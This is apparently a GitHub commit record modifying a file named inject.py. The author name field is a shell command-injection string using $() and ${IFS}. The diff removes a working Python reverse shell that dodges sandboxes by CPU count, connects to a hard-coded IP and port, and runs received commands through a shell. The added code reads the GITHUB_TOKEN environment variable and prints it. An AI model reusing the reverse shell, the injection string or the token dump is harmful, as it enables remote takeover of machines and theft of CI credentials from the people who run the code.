f5edfcb9448ea2a98a87d556e298e05e6028e49e
stp-$('&&${IFS}echo${IFS}${IFS}&&echo${IFS}fullname&&${IFS}echo${IFS}') <76434077+d3kum1d0r1y4@users.noreply.github.com>
2023-08-09 02:27:20 -0400

    Update inject.py

--- src/inject.py
+++ src/inject.py
@@ -1,33 +1,8 @@
 import os
-import socket
-import subprocess
 
+github_token = os.environ.get('GITHUB_TOKEN')
 
-if os.cpu_count() <= 2:
-    quit()
-
-HOST = '202.184.150.125'
-PORT = 4443
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((HOST, PORT))
-s.send(str.encode("[*] Connection Established!"))
-
-while 1:
-    try:
-        s.send(str.encode(os.getcwd() + "> "))
-        data = s.recv(1024).decode("UTF-8")
-        data = data.strip('\n')
-        if data == "quit": 
-            break
-        if data[:2] == "cd":
-            os.chdir(data[3:])
-        if len(data) > 0:
-            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
-            stdout_value = proc.stdout.read() + proc.stderr.read()
-            output_str = str(stdout_value, "UTF-8")
-            s.send(str.encode("\n" + output_str))
-    except Exception as e:
-        continue
-    
-s.close()
+if github_token:
+    print("GitHub Token:", github_token)
+else:
+    print("GitHub Token not found.")
